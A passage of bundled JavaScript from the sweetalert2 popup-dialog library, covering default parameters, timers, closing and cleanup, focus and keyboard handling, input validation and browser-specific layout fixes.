      resolve();
    }, RESTORE_FOCUS_TIMEOUT);
    if (typeof x !== "undefined" && typeof y !== "undefined") {
      window.scrollTo(x, y);
    }
  });
};

// node_modules/sweetalert2/src/staticMethods/timer.js
var getTimerLeft = () => {
  return globalState_default.timeout && globalState_default.timeout.getTimerLeft();
};
var stopTimer = () => {
  return globalState_default.timeout && globalState_default.timeout.stop();
};
var resumeTimer = () => {
  return globalState_default.timeout && globalState_default.timeout.start();
};
var toggleTimer = () => {
  const timer = globalState_default.timeout;
  return timer && (timer.running ? timer.stop() : timer.start());
};
var increaseTimer = (n) => {
  return globalState_default.timeout && globalState_default.timeout.increase(n);
};
var isTimerRunning = () => {
  return globalState_default.timeout && globalState_default.timeout.isRunning();
};

// node_modules/sweetalert2/src/utils/params.js
var defaultParams = {
  title: "",
  titleText: "",
  text: "",
  html: "",
  footer: "",
  type: null,
  toast: false,
  customClass: "",
  customContainerClass: "",
  target: "body",
  backdrop: true,
  animation: true,
  heightAuto: true,
  allowOutsideClick: true,
  allowEscapeKey: true,
  allowEnterKey: true,
  stopKeydownPropagation: true,
  keydownListenerCapture: false,
  showConfirmButton: true,
  showCancelButton: false,
  preConfirm: null,
  confirmButtonText: "OK",
  confirmButtonAriaLabel: "",
  confirmButtonColor: null,
  confirmButtonClass: "",
  cancelButtonText: "Cancel",
  cancelButtonAriaLabel: "",
  cancelButtonColor: null,
  cancelButtonClass: "",
  buttonsStyling: true,
  reverseButtons: false,
  focusConfirm: true,
  focusCancel: false,
  showCloseButton: false,
  closeButtonHtml: "&times;",
  closeButtonAriaLabel: "Close this dialog",
  showLoaderOnConfirm: false,
  imageUrl: null,
  imageWidth: null,
  imageHeight: null,
  imageAlt: "",
  imageClass: "",
  timer: null,
  width: null,
  padding: null,
  background: null,
  input: null,
  inputPlaceholder: "",
  inputValue: "",
  inputOptions: {},
  inputAutoTrim: true,
  inputClass: "",
  inputAttributes: {},
  inputValidator: null,
  validationMessage: null,
  grow: false,
  position: "center",
  progressSteps: [],
  currentProgressStep: null,
  progressStepsDistance: null,
  onBeforeOpen: null,
  onOpen: null,
  onRender: null,
  onClose: null,
  onAfterClose: null,
  scrollbarPadding: true
};
var updatableParams = [
  "title",
  "titleText",
  "text",
  "html",
  "type",
  "customClass",
  "showConfirmButton",
  "showCancelButton",
  "confirmButtonText",
  "confirmButtonAriaLabel",
  "confirmButtonColor",
  "confirmButtonClass",
  "cancelButtonText",
  "cancelButtonAriaLabel",
  "cancelButtonColor",
  "cancelButtonClass",
  "buttonsStyling",
  "reverseButtons",
  "imageUrl",
  "imageWidth",
  "imageHeigth",
  "imageAlt",
  "imageClass",
  "progressSteps",
  "currentProgressStep"
];
var deprecatedParams = {
  customContainerClass: "customClass",
  confirmButtonClass: "customClass",
  cancelButtonClass: "customClass",
  imageClass: "customClass",
  inputClass: "customClass"
};
var toastIncompatibleParams = [
  "allowOutsideClick",
  "allowEnterKey",
  "backdrop",
  "focusConfirm",
  "focusCancel",
  "heightAuto",
  "keydownListenerCapture"
];
var isValidParameter = (paramName) => {
  return Object.prototype.hasOwnProperty.call(defaultParams, paramName);
};
var isUpdatableParameter = (paramName) => {
  return updatableParams.indexOf(paramName) !== -1;
};
var isDeprecatedParameter = (paramName) => {
  return deprecatedParams[paramName];
};
var checkIfParamIsValid = (param) => {
  if (!isValidParameter(param)) {
    warn(`Unknown parameter "${param}"`);
  }
};
var checkIfToastParamIsValid = (param) => {
  if (toastIncompatibleParams.includes(param)) {
    warn(`The parameter "${param}" is incompatible with toasts`);
  }
};
var checkIfParamIsDeprecated = (param) => {
  if (isDeprecatedParameter(param)) {
    warnAboutDepreation(param, isDeprecatedParameter(param));
  }
};
var showWarningsForParams = (params) => {
  for (const param in params) {
    checkIfParamIsValid(param);
    if (params.toast) {
      checkIfToastParamIsValid(param);
    }
    checkIfParamIsDeprecated();
  }
};
var params_default = defaultParams;

// node_modules/sweetalert2/src/instanceMethods.js
var instanceMethods_exports = {};
__export(instanceMethods_exports, {
  _main: () => _main,
  close: () => close,
  closeModal: () => close,
  closePopup: () => close,
  closeToast: () => close,
  disableButtons: () => disableButtons,
  disableConfirmButton: () => disableConfirmButton,
  disableInput: () => disableInput,
  disableLoading: () => hideLoading,
  enableButtons: () => enableButtons,
  enableConfirmButton: () => enableConfirmButton,
  enableInput: () => enableInput,
  getInput: () => getInput2,
  getProgressSteps: () => getProgressSteps2,
  hideLoading: () => hideLoading,
  hideProgressSteps: () => hideProgressSteps,
  resetValidationMessage: () => resetValidationMessage2,
  setProgressSteps: () => setProgressSteps,
  showProgressSteps: () => showProgressSteps,
  showValidationMessage: () => showValidationMessage,
  update: () => update
});

// node_modules/sweetalert2/src/instanceMethods/hideLoading.js
function hideLoading() {
  const innerParams = privateProps_default.innerParams.get(this);
  const domCache = privateProps_default.domCache.get(this);
  if (!innerParams.showConfirmButton) {
    hide(domCache.confirmButton);
    if (!innerParams.showCancelButton) {
      hide(domCache.actions);
    }
  }
  removeClass([domCache.popup, domCache.actions], swalClasses.loading);
  domCache.popup.removeAttribute("aria-busy");
  domCache.popup.removeAttribute("data-loading");
  domCache.confirmButton.disabled = false;
  domCache.cancelButton.disabled = false;
}

// node_modules/sweetalert2/src/instanceMethods/getInput.js
function getInput2(instance) {
  const innerParams = privateProps_default.innerParams.get(instance || this);
  const domCache = privateProps_default.domCache.get(instance || this);
  if (!domCache) {
    return null;
  }
  return getInput(domCache.content, innerParams.input);
}

// node_modules/sweetalert2/src/utils/scrollbarFix.js
var fixScrollbar = () => {
  if (states.previousBodyPadding !== null) {
    return;
  }
  if (document.body.scrollHeight > window.innerHeight) {
    states.previousBodyPadding = parseInt(window.getComputedStyle(document.body).getPropertyValue("padding-right"));
    document.body.style.paddingRight = states.previousBodyPadding + measureScrollbar() + "px";
  }
};
var undoScrollbar = () => {
  if (states.previousBodyPadding !== null) {
    document.body.style.paddingRight = states.previousBodyPadding + "px";
    states.previousBodyPadding = null;
  }
};

// node_modules/sweetalert2/src/utils/iosFix.js
var iOSfix = () => {
  const iOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream || navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1;
  if (iOS && !hasClass(document.body, swalClasses.iosfix)) {
    const offset = document.body.scrollTop;
    document.body.style.top = offset * -1 + "px";
    addClass(document.body, swalClasses.iosfix);
    lockBodyScroll();
  }
};
var lockBodyScroll = () => {
  const container = getContainer();
  let preventTouchMove;
  container.ontouchstart = (e) => {
    preventTouchMove = e.target === container || !isScrollable(container) && e.target.tagName !== "INPUT";
  };
  container.ontouchmove = (e) => {
    if (preventTouchMove) {
      e.preventDefault();
      e.stopPropagation();
    }
  };
};
var undoIOSfix = () => {
  if (hasClass(document.body, swalClasses.iosfix)) {
    const offset = parseInt(document.body.style.top, 10);
    removeClass(document.body, swalClasses.iosfix);
    document.body.style.top = "";
    document.body.scrollTop = offset * -1;
  }
};

// node_modules/sweetalert2/src/utils/ieFix.js
var isIE11 = () => !!window.MSInputMethodContext && !!document.documentMode;
var fixVerticalPositionIE = () => {
  const container = getContainer();
  const popup = getPopup();
  container.style.removeProperty("align-items");
  if (popup.offsetTop < 0) {
    container.style.alignItems = "flex-start";
  }
};
var IEfix = () => {
  if (typeof window !== "undefined" && isIE11()) {
    fixVerticalPositionIE();
    window.addEventListener("resize", fixVerticalPositionIE);
  }
};
var undoIEfix = () => {
  if (typeof window !== "undefined" && isIE11()) {
    window.removeEventListener("resize", fixVerticalPositionIE);
  }
};

// node_modules/sweetalert2/src/utils/aria.js
var setAriaHidden = () => {
  const bodyChildren = toArray(document.body.children);
  bodyChildren.forEach((el) => {
    if (el === getContainer() || contains(el, getContainer())) {
      return;
    }
    if (el.hasAttribute("aria-hidden")) {
      el.setAttribute("data-previous-aria-hidden", el.getAttribute("aria-hidden"));
    }
    el.setAttribute("aria-hidden", "true");
  });
};
var unsetAriaHidden = () => {
  const bodyChildren = toArray(document.body.children);
  bodyChildren.forEach((el) => {
    if (el.hasAttribute("data-previous-aria-hidden")) {
      el.setAttribute("aria-hidden", el.getAttribute("data-previous-aria-hidden"));
      el.removeAttribute("data-previous-aria-hidden");
    } else {
      el.removeAttribute("aria-hidden");
    }
  });
};

// node_modules/sweetalert2/src/privateMethods.js
var privateMethods_default = {
  swalPromiseResolve: /* @__PURE__ */ new WeakMap()
};

// node_modules/sweetalert2/src/instanceMethods/close.js
function removePopupAndResetState(instance, container, isToast2, onAfterClose) {
  if (isToast2) {
    triggerOnAfterCloseAndDispose(instance, onAfterClose);
  } else {
    restoreActiveElement().then(() => triggerOnAfterCloseAndDispose(instance, onAfterClose));
    globalState_default.keydownTarget.removeEventListener("keydown", globalState_default.keydownHandler, { capture: globalState_default.keydownListenerCapture });
    globalState_default.keydownHandlerAdded = false;
  }
  if (container.parentNode) {
    container.parentNode.removeChild(container);
  }
  if (isModal()) {
    undoScrollbar();
    undoIOSfix();
    undoIEfix();
    unsetAriaHidden();
  }
  removeBodyClasses();
}
function removeBodyClasses() {
  removeClass([document.documentElement, document.body], [
    swalClasses.shown,
    swalClasses["height-auto"],
    swalClasses["no-backdrop"],
    swalClasses["toast-shown"],
    swalClasses["toast-column"]
  ]);
}
function disposeSwal(instance) {
  delete instance.params;
  delete globalState_default.keydownHandler;
  delete globalState_default.keydownTarget;
  unsetWeakMaps(privateProps_default);
  unsetWeakMaps(privateMethods_default);
}
function close(resolveValue) {
  const popup = getPopup();
  if (!popup || hasClass(popup, swalClasses.hide)) {
    return;
  }
  const innerParams = privateProps_default.innerParams.get(this);
  if (!innerParams) {
    return;
  }
  const swalPromiseResolve = privateMethods_default.swalPromiseResolve.get(this);
  removeClass(popup, swalClasses.show);
  addClass(popup, swalClasses.hide);
  handlePopupAnimation(this, popup, innerParams);
  swalPromiseResolve(resolveValue || {});
}
var handlePopupAnimation = (instance, popup, innerParams) => {
  const container = getContainer();
  const animationIsSupported = animationEndEvent && hasCssAnimation(popup);
  const { onClose, onAfterClose } = innerParams;
  if (onClose !== null && typeof onClose === "function") {
    onClose(popup);
  }
  if (animationIsSupported) {
    animatePopup(instance, popup, container, onAfterClose);
  } else {
    removePopupAndResetState(instance, container, isToast(), onAfterClose);
  }
};
var animatePopup = (instance, popup, container, onAfterClose) => {
  globalState_default.swalCloseEventFinishedCallback = removePopupAndResetState.bind(null, instance, container, isToast(), onAfterClose);
  popup.addEventListener(animationEndEvent, function(e) {
    if (e.target === popup) {
      globalState_default.swalCloseEventFinishedCallback();
      delete globalState_default.swalCloseEventFinishedCallback;
    }
  });
};
var unsetWeakMaps = (obj) => {
  for (const i in obj) {
    obj[i] = /* @__PURE__ */ new WeakMap();
  }
};
var triggerOnAfterCloseAndDispose = (instance, onAfterClose) => {
  setTimeout(() => {
    if (onAfterClose !== null && typeof onAfterClose === "function") {
      onAfterClose();
    }
    if (!getPopup()) {
      disposeSwal(instance);
    }
  });
};

// node_modules/sweetalert2/src/instanceMethods/enable-disable-elements.js
function setButtonsDisabled(instance, buttons, disabled) {
  const domCache = privateProps_default.domCache.get(instance);
  buttons.forEach((button) => {
    domCache[button].disabled = disabled;
  });
}
function setInputDisabled(input, disabled) {
  if (!input) {
    return false;
  }
  if (input.type === "radio") {
    const radiosContainer = input.parentNode.parentNode;
    const radios = radiosContainer.querySelectorAll("input");
    for (let i = 0; i < radios.length; i++) {
      radios[i].disabled = disabled;
    }
  } else {
    input.disabled = disabled;
  }
}
function enableButtons() {
  setButtonsDisabled(this, ["confirmButton", "cancelButton"], false);
}
function disableButtons() {
  setButtonsDisabled(this, ["confirmButton", "cancelButton"], true);
}
function enableConfirmButton() {
  warnAboutDepreation("Swal.enableConfirmButton()", `Swal.getConfirmButton().removeAttribute('disabled')`);
  setButtonsDisabled(this, ["confirmButton"], false);
}
function disableConfirmButton() {
  warnAboutDepreation("Swal.disableConfirmButton()", `Swal.getConfirmButton().setAttribute('disabled', '')`);
  setButtonsDisabled(this, ["confirmButton"], true);
}
function enableInput() {
  return setInputDisabled(this.getInput(), false);
}
function disableInput() {
  return setInputDisabled(this.getInput(), true);
}

// node_modules/sweetalert2/src/instanceMethods/show-reset-validation-error.js
function showValidationMessage(error2) {
  const domCache = privateProps_default.domCache.get(this);
  domCache.validationMessage.innerHTML = error2;
  const popupComputedStyle = window.getComputedStyle(domCache.popup);
  domCache.validationMessage.style.marginLeft = `-${popupComputedStyle.getPropertyValue("padding-left")}`;
  domCache.validationMessage.style.marginRight = `-${popupComputedStyle.getPropertyValue("padding-right")}`;
  show(domCache.validationMessage);
  const input = this.getInput();
  if (input) {
    input.setAttribute("aria-invalid", true);
    input.setAttribute("aria-describedBy", swalClasses["validation-message"]);
    focusInput(input);
    addClass(input, swalClasses.inputerror);
  }
}
function resetValidationMessage2() {
  const domCache = privateProps_default.domCache.get(this);
  if (domCache.validationMessage) {
    hide(domCache.validationMessage);
  }
  const input = this.getInput();
  if (input) {
    input.removeAttribute("aria-invalid");
    input.removeAttribute("aria-describedBy");
    removeClass(input, swalClasses.inputerror);
  }
}

// node_modules/sweetalert2/src/instanceMethods/progress-steps.js
function getProgressSteps2() {
  warnAboutDepreation("Swal.getProgressSteps()", `const swalInstance = Swal.fire({progressSteps: ['1', '2', '3']}); const progressSteps = swalInstance.params.progressSteps`);
  const innerParams = privateProps_default.innerParams.get(this);
  return innerParams.progressSteps;
}
function setProgressSteps(progressSteps) {
  warnAboutDepreation("Swal.setProgressSteps()", "Swal.update()");
  const innerParams = privateProps_default.innerParams.get(this);
  const updatedParams = Object.assign({}, innerParams, { progressSteps });
  renderProgressSteps(this, updatedParams);
  privateProps_default.innerParams.set(this, updatedParams);
}
function showProgressSteps() {
  const domCache = privateProps_default.domCache.get(this);
  show(domCache.progressSteps);
}
function hideProgressSteps() {
  const domCache = privateProps_default.domCache.get(this);
  hide(domCache.progressSteps);
}

// node_modules/sweetalert2/src/utils/Timer.js
var Timer = class {
  constructor(callback, delay) {
    this.callback = callback;
    this.remaining = delay;
    this.running = false;
    this.start();
  }
  start() {
    if (!this.running) {
      this.running = true;
      this.started = new Date();
      this.id = setTimeout(this.callback, this.remaining);
    }
    return this.remaining;
  }
  stop() {
    if (this.running) {
      this.running = false;
      clearTimeout(this.id);
      this.remaining -= new Date() - this.started;
    }
    return this.remaining;
  }
  increase(n) {
    const running = this.running;
    if (running) {
      this.stop();
    }
    this.remaining += n;
    if (running) {
      this.start();
    }
    return this.remaining;
  }
  getTimerLeft() {
    if (this.running) {
      this.stop();
      this.start();
    }
    return this.remaining;
  }
  isRunning() {
    return this.running;
  }
};

// node_modules/sweetalert2/src/utils/defaultInputValidators.js
var defaultInputValidators_default = {
  email: (string, validationMessage) => {
    return /^[a-zA-Z0-9.+_-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9-]{2,24}$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid email address");
  },
  url: (string, validationMessage) => {
    return /^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{2,256}\.[a-z]{2,63}\b([-a-zA-Z0-9@:%_+.~#?&/=]*)$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid URL");
  }
};

// node_modules/sweetalert2/src/utils/setParameters.js
function setDefaultInputValidators(params) {
  if (!params.inputValidator) {
    Object.keys(defaultInputValidators_default).forEach((key) => {
      if (params.input === key) {
        params.inputValidator = defaultInputValidators_default[key];
      }
    });
  }
}
function validateCustomTargetElement(params) {
  if (!params.target || typeof params.target === "string" && !document.querySelector(params.target) || typeof params.target !== "string" && !params.target.appendChild) {
    warn('Target parameter is not valid, defaulting to "body"');
    params.target = "body";
  }
}
function setParameters(params) {
  setDefaultInputValidators(params);
  if (params.showLoaderOnConfirm && !params.preConfirm) {
    warn("showLoaderOnConfirm is set to true, but preConfirm is not defined.\nshowLoaderOnConfirm should be used together with preConfirm, see usage example:\nhttps://sweetalert2.github.io/#ajax-request");
  }
  params.animation = callIfFunction(params.animation);
  validateCustomTargetElement(params);
  if (typeof params.title === "string") {
    params.title = params.title.split("\n").join("<br />");
  }
  init(params);
}

// node_modules/sweetalert2/src/utils/openPopup.js
function swalOpenAnimationFinished(popup, container) {
  popup.removeEventListener(animationEndEvent, swalOpenAnimationFinished);
  container.style.overflowY = "auto";
}
var openPopup = (params) => {
  const container = getContainer();
  const popup = getPopup();
  if (typeof params.onBeforeOpen === "function") {
    params.onBeforeOpen(popup);
  }
  addClasses(container, popup, params);
  setScrollingVisibility(container, popup);
  if (isModal()) {
    fixScrollContainer(container, params.scrollbarPadding);
  }
  if (!isToast() && !globalState_default.previousActiveElement) {
    globalState_default.previousActiveElement = document.activeElement;
  }
  if (typeof params.onOpen === "function") {
    setTimeout(() => params.onOpen(popup));
  }
};
var setScrollingVisibility = (container, popup) => {
  if (animationEndEvent && hasCssAnimation(popup)) {
    container.style.overflowY = "hidden";
    popup.addEventListener(animationEndEvent, swalOpenAnimationFinished.bind(null, popup, container));
  } else {
    container.style.overflowY = "auto";
  }
};
var fixScrollContainer = (container, scrollbarPadding) => {
  iOSfix();
  IEfix();
  setAriaHidden();
  if (scrollbarPadding) {
    fixScrollbar();
  }
  setTimeout(() => {
    container.scrollTop = 0;
  });
};
var addClasses = (container, popup, params) => {
  if (params.animation) {
    addClass(popup, swalClasses.show);
  }
  show(popup);
  addClass([document.documentElement, document.body, container], swalClasses.shown);
  if (params.heightAuto && params.backdrop && !params.toast) {
    addClass([document.documentElement, document.body], swalClasses["height-auto"]);
  }
};

// node_modules/sweetalert2/src/utils/dom/inputUtils.js
var handleInputOptionsAndValue = (instance, params) => {
  if (params.input === "select" || params.input === "radio") {
    handleInputOptions(instance, params);
  } else if (["text", "email", "number", "tel", "textarea"].includes(params.input) && isPromise(params.inputValue)) {
    handleInputValue(instance, params);
  }
};
var getInputValue = (instance, innerParams) => {
  const input = instance.getInput();
  if (!input) {
    return null;
  }
  switch (innerParams.input) {
    case "checkbox":
      return getCheckboxValue(input);
    case "radio":
      return getRadioValue(input);
    case "file":
      return getFileValue(input);
    default:
      return innerParams.inputAutoTrim ? input.value.trim() : input.value;
  }
};
var getCheckboxValue = (input) => input.checked ? 1 : 0;
var getRadioValue = (input) => input.checked ? input.value : null;
var getFileValue = (input) => input.files.length ? input.getAttribute("multiple") !== null ? input.files : input.files[0] : null;
var handleInputOptions = (instance, params) => {
  const content = getContent();
  const processInputOptions = (inputOptions) => populateInputOptions[params.input](content, formatInputOptions(inputOptions), params);
  if (isPromise(params.inputOptions)) {
    showLoading();
    params.inputOptions.then((inputOptions) => {
      instance.hideLoading();
      processInputOptions(inputOptions);
    });
  } else if (typeof params.inputOptions === "object") {
    processInputOptions(params.inputOptions);
  } else {
    error(`Unexpected type of inputOptions! Expected object, Map or Promise, got ${typeof params.inputOptions}`);
  }
};
var handleInputValue = (instance, params) => {
  const input = instance.getInput();
  hide(input);
  params.inputValue.then((inputValue) => {
    input.value = params.input === "number" ? parseFloat(inputValue) || 0 : inputValue + "";
    show(input);
    input.focus();
    instance.hideLoading();
  }).catch((err) => {
    error("Error in inputValue promise: " + err);
    input.value = "";
    show(input);
    input.focus();
    instance.hideLoading();
  });
};
var populateInputOptions = {
  select: (content, inputOptions, params) => {
    const select = getChildByClass(content, swalClasses.select);
    inputOptions.forEach((inputOption) => {
      const optionValue = inputOption[0];
      const optionLabel = inputOption[1];
      const option = document.createElement("option");
      option.value = optionValue;
      option.innerHTML = optionLabel;
      if (params.inputValue.toString() === optionValue.toString()) {
        option.selected = true;
      }
      select.appendChild(option);
    });
    select.focus();
  },
  radio: (content, inputOptions, params) => {
    const radio = getChildByClass(content, swalClasses.radio);
    inputOptions.forEach((inputOption) => {
      const radioValue = inputOption[0];
      const radioLabel = inputOption[1];
      const radioInput = document.createElement("input");
      const radioLabelElement = document.createElement("label");
      radioInput.type = "radio";
      radioInput.name = swalClasses.radio;
      radioInput.value = radioValue;
      if (params.inputValue.toString() === radioValue.toString()) {
        radioInput.checked = true;
      }
      const label = document.createElement("span");
      label.innerHTML = radioLabel;
      label.className = swalClasses.label;
      radioLabelElement.appendChild(radioInput);
      radioLabelElement.appendChild(label);
      radio.appendChild(radioLabelElement);
    });
    const radios = radio.querySelectorAll("input");
    if (radios.length) {
      radios[0].focus();
    }
  }
};
var formatInputOptions = (inputOptions) => {
  const result = [];
  if (typeof Map !== "undefined" && inputOptions instanceof Map) {
    inputOptions.forEach((value, key) => {
      result.push([key, value]);
    });
  } else {
    Object.keys(inputOptions).forEach((key) => {
      result.push([key, inputOptions[key]]);
    });
  }
  return result;
};

// node_modules/sweetalert2/src/instanceMethods/buttons-handlers.js
var handleConfirmButtonClick = (instance, innerParams) => {
  instance.disableButtons();
  if (innerParams.input) {
    handleConfirmWithInput(instance, innerParams);
  } else {
    confirm(instance, innerParams, true);
  }
};
var handleCancelButtonClick = (instance, dismissWith) => {
  instance.disableButtons();
  dismissWith(DismissReason.cancel);
};
var handleConfirmWithInput = (instance, innerParams) => {
  const inputValue = getInputValue(instance, innerParams);
  if (innerParams.inputValidator) {
    instance.disableInput();
    const validationPromise = Promise.resolve().then(() => innerParams.inputValidator(inputValue, innerParams.validationMessage));
    validationPromise.then((validationMessage) => {
      instance.enableButtons();
      instance.enableInput();
      if (validationMessage) {
        instance.showValidationMessage(validationMessage);
      } else {
        confirm(instance, innerParams, inputValue);
      }
    });
  } else if (!instance.getInput().checkValidity()) {
    instance.enableButtons();
    instance.showValidationMessage(innerParams.validationMessage);
  } else {
    confirm(instance, innerParams, inputValue);
  }
};
var succeedWith = (instance, value) => {
  instance.closePopup({ value });
};
var confirm = (instance, innerParams, value) => {
  if (innerParams.showLoaderOnConfirm) {
    showLoading();
  }
  if (innerParams.preConfirm) {
    instance.resetValidationMessage();
    const preConfirmPromise = Promise.resolve().then(() => innerParams.preConfirm(value, innerParams.validationMessage));
    preConfirmPromise.then((preConfirmValue) => {
      if (isVisible(getValidationMessage()) || preConfirmValue === false) {
        instance.hideLoading();
      } else {
        succeedWith(instance, typeof preConfirmValue === "undefined" ? value : preConfirmValue);
      }
    });
  } else {
    succeedWith(instance, value);
  }
};

// node_modules/sweetalert2/src/instanceMethods/keydown-handler.js
var addKeydownHandler = (instance, globalState2, innerParams, dismissWith) => {
  if (globalState2.keydownTarget && globalState2.keydownHandlerAdded) {
    globalState2.keydownTarget.removeEventListener("keydown", globalState2.keydownHandler, { capture: globalState2.keydownListenerCapture });
    globalState2.keydownHandlerAdded = false;
  }
  if (!innerParams.toast) {
    globalState2.keydownHandler = (e) => keydownHandler(instance, e, innerParams, dismissWith);
    globalState2.keydownTarget = innerParams.keydownListenerCapture ? window : getPopup();
    globalState2.keydownListenerCapture = innerParams.keydownListenerCapture;
    globalState2.keydownTarget.addEventListener("keydown", globalState2.keydownHandler, { capture: globalState2.keydownListenerCapture });
    globalState2.keydownHandlerAdded = true;
  }
};
var setFocus = (innerParams, index, increment) => {
  const focusableElements = getFocusableElements();
  for (let i = 0; i < focusableElements.length; i++) {
    index = index + increment;
    if (index === focusableElements.length) {
      index = 0;
    } else if (index === -1) {
      index = focusableElements.length - 1;
    }
    return focusableElements[index].focus();
  }
  getPopup().focus();
};
var arrowKeys = [
  "ArrowLeft",
  "ArrowRight",
  "ArrowUp",
  "ArrowDown",
  "Left",
  "Right",
  "Up",
  "Down"
];
var escKeys = [
  "Escape",
  "Esc"
];
var keydownHandler = (instance, e, innerParams, dismissWith) => {
  if (innerParams.stopKeydownPropagation) {
    e.stopPropagation();
  }
  if (e.key === "Enter") {
    handleEnter(instance, e, innerParams);
  } else if (e.key === "Tab") {
    handleTab(e, innerParams);
  } else if (arrowKeys.includes(e.key)) {
    handleArrows();
  } else if (escKeys.includes(e.key)) {
    handleEsc(e, innerParams, dismissWith);
  }
};
var handleEnter = (instance, e, innerParams) => {
  if (e.isComposing) {
    return;
  }
  if (e.target && instance.getInput() && e.target.outerHTML === instance.getInput().outerHTML) {
    if (["textarea", "file"].includes(innerParams.input)) {
      return;
    }
    clickConfirm();
    e.preventDefault();
  }
};
var handleTab = (e, innerParams) => {
  const targetElement = e.target;
  const focusableElements = getFocusableElements();
  let btnIndex = -1;
  for (let i = 0; i < focusableElements.length; i++) {
    if (targetElement === focusableElements[i]) {
      btnIndex = i;
      break;
    }
  }
  if (!e.shiftKey) {
    setFocus(innerParams, btnIndex, 1);
  } else {
    setFocus(innerParams, btnIndex, -1);
  }
  e.stopPropagation();
  e.preventDefault();
};
var handleArrows = () => {
  const confirmButton = getConfirmButton();
  const cancelButton = getCancelButton();
  if (document.activeElement === confirmButton && isVisible(cancelButton)) {
    cancelButton.focus();
  } else if (document.activeElement === cancelButton && isVisible(confirmButton)) {
    confirmButton.focus();
  }
};
var handleEsc = (e, innerParams, dismissWith) => {
  if (callIfFunction(innerParams.allowEscapeKey)) {
    e.preventDefault();
    dismissWith(DismissReason.esc);
  }
};

// node_modules/sweetalert2/src/instanceMethods/popup-click-handler.js
var handlePopupClick = (domCache, innerParams, dismissWith) => {
  if (innerParams.toast) {
    handleToastClick(domCache, innerParams, dismissWith);
  } else {
    handleModalMousedown(domCache);
    handleContainerMousedown(domCache);
    handleModalClick(domCache, innerParams, dismissWith);
  }
};
var handleToastClick = (domCache, innerParams, dismissWith) => {
  domCache.popup.onclick = () => {
    if (innerParams.showConfirmButton || innerParams.showCancelButton || innerParams.showCloseButton || innerParams.input) {
      return;
    }
    dismissWith(DismissReason.close);
  };
};
var ignoreOutsideClick = false;
var handleModalMousedown = (domCache) => {
  domCache.popup.onmousedown = () => {
    domCache.container.onmouseup = function(e) {
      domCache.container.onmouseup = void 0;
      if (e.target === domCache.container) {
        ignoreOutsideClick = true;
      }
    };
  };
};
var handleContainerMousedown = (domCache) => {
  domCache.container.onmousedown = () => {
    domCache.popup.onmouseup = function(e) {
      domCache.popup.onmouseup = void 0;
      if (e.target === domCache.popup || domCache.popup.contains(e.target)) {
        ignoreOutsideClick = true;
      }
    };
  };
};
var handleModalClick = (domCache, innerParams, dismissWith) => {
  domCache.container.onclick = (e) => {
    if (ignoreOutsideClick) {
      ignoreOutsideClick = false;
      return;
    }
    if (e.target === domCache.container && callIfFunction(innerParams.allowOutsideClick)) {
      dismissWith(DismissReason.backdrop);
    }
  };
};

// node_modules/sweetalert2/src/instanceMethods/_main.js
function _main(userParams) {
  showWarningsForParams(userParams);
  if (getPopup() && globalState_default.swalCloseEventFinishedCallback) {
    globalState_default.swalCloseEventFinishedCallback();
    delete globalState_default.swalCloseEventFinishedCallback;
  }
  if (globalState_default.deferDisposalTimer) {
    clearTimeout(globalState_default.deferDisposalTimer);
    delete globalState_default.deferDisposalTimer;
  }
  const innerParams = Object.assign({}, params_default, userParams);
  setParameters(innerParams);
  Object.freeze(innerParams);
  if (globalState_default.timeout) {
    globalState_default.timeout.stop();
    delete globalState_default.timeout;
  }
  clearTimeout(globalState_default.restoreFocusTimeout);
  const domCache = populateDomCache(this);
  render(this, innerParams);
  privateProps_default.innerParams.set(this, innerParams);
  return swalPromise(this, domCache, innerParams);
}
var swalPromise = (instance, domCache, innerParams) => {
  return new Promise((resolve) => {
    const dismissWith = (dismiss) => {
      instance.closePopup({ dismiss });
    };
    privateMethods_default.swalPromiseResolve.set(instance, resolve);
    setupTimer(globalState_default, innerParams, dismissWith);
    domCache.confirmButton.onclick = () => handleConfirmButtonClick(instance, innerParams);
    domCache.cancelButton.onclick = () => handleCancelButtonClick(instance, dismissWith);
    domCache.closeButton.onclick = () => dismissWith(DismissReason.close);
    handlePopupClick(domCache, innerParams, dismissWith);
    addKeydownHandler(instance, globalState_default, innerParams, dismissWith);
    if (innerParams.toast && (innerParams.input || innerParams.footer || innerParams.showCloseButton)) {
      addClass(document.body, swalClasses["toast-column"]);
    } else {
      removeClass(document.body, swalClasses["toast-column"]);
    }
    handleInputOptionsAndValue(instance, innerParams);
    openPopup(innerParams);
    initFocus(domCache, innerParams);
    domCache.container.scrollTop = 0;
  });
};
var populateDomCache = (instance) => {
  const domCache = {
    popup: getPopup(),
    container: getContainer(),
    content: getContent(),
    actions: getActions(),
    confirmButton: getConfirmButton(),
    cancelButton: getCancelButton(),
    closeButton: getCloseButton(),
    validationMessage: getValidationMessage(),
    progressSteps: getProgressSteps()
  };
  privateProps_default.domCache.set(instance, domCache);
  return domCache;
};
var setupTimer = (globalState2, innerParams, dismissWith) => {
  if (innerParams.timer) {
    globalState2.timeout = new Timer(() => {
      dismissWith("timer");
      delete globalState2.timeout;
    }, innerParams.timer);
  }
};
var initFocus = (domCache, innerParams) => {
  if (innerParams.toast) {
    return;
  }
  if (!callIfFunction(innerParams.allowEnterKey)) {
    return blurActiveElement();
  }
  if (innerParams.focusCancel && isVisible(domCache.cancelButton)) {
    return domCache.cancelButton.focus();
  }
  if (innerParams.focusConfirm && isVisible(domCache.confirmButton)) {
    return domCache.confirmButton.focus();
  }
  setFocus(innerParams, -1, 1);
};
var blurActiveElement = () => {
  if (document.activeElement && typeof document.activeElement.blur === "function") {
    document.activeElement.blur();
  }
};

// node_modules/sweetalert2/src/instanceMethods/update.js
function update(params) {
  const popup = getPopup();
  if (!popup || hasClass(popup, swalClasses.hide)) {
    return warn(`You're trying to update the closed or closing popup, that won't work. Use the update() method in preConfirm parameter or show a new popup.`);
  }
  const validUpdatableParams = {};
  Object.keys(params).forEach((param) => {
    if (sweetalert2_default.isUpdatableParameter(param)) {
      validUpdatableParams[param] = params[param];
    } else {
      warn(`Invalid parameter to update: "${param}". Updatable params are listed here: https://github.com/sweetalert2/sweetalert2/blob/master/src/utils/params.js`);
    }
  });
  const innerParams = privateProps_default.innerParams.get(this);
  const updatedParams = Object.assign({}, innerParams, validUpdatableParams);
  render(this, updatedParams);
